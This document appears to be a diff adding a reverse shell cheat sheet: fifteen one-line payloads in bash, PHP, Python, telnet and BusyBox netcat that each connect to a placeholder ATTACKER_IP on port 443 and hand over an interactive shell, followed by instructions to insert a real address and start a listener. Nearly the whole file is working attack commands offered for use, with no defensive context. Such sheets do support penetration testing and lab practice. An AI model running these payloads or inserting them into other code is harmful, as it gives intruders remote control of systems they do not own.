@@ -1,0 +1,66 @@
+# ========================
+# Reverse Shell Cheat Sheet
+# ========================
+
+# 1. Basic Bash Reverse Shell
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+# Opens an interactive bash shell and redirects input/output to a TCP connection
+
+# 2. File Descriptor Shell with Loop
+exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+# Uses file descriptor 5 to read attacker commands and send back output/errors
+
+# 3. Custom File Descriptor Shell
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+# Same as above but uses FD 196; runs sh with I/O bound to the socket
+
+# 4. Bash with FD 5 for all I/O
+bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+# Connects via TCP and redirects stdin, stdout, and stderr through FD 5
+
+# 5. PHP fsockopen + exec
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+# Opens a reverse shell using exec() in PHP
+
+# 6. PHP fsockopen + shell_exec
+php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+# Uses shell_exec() to spawn shell
+
+# 7. PHP fsockopen + system
+php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+# Uses system() to execute shell
+
+# 8. PHP fsockopen + passthru
+php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+# passthru() sends raw output of shell to attacker
+
+# 9. PHP fsockopen + popen
+php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+# popen() creates a pipe to a shell
+
+# 10. Python reverse shell with environment vars
+export RHOST="ATTACKER_IP"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+# Python reverse shell using socket + pty
+
+# 11. Python reverse shell (inline IP)
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+# One-liner reverse shell with hardcoded IP and port
+
+# 12. Shorter version of Python reverse shell
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+# More compact, same functionality
+
+# 13. Telnet reverse shell with FIFO
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+# Uses a named pipe and telnet to create a reverse shell
+
+# 14. Same as above (duplicate)
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+
+# 15. BusyBox Netcat reverse shell
+busybox nc ATTACKER_IP 443 -e sh
+# BusyBox built-in nc to execute sh over TCP
+
+# Note:
+# Replace ATTACKER_IP and port 443 with your actual IP and port
+# Always run a listener on attacker machine: ncat -lvnp 443 or similar
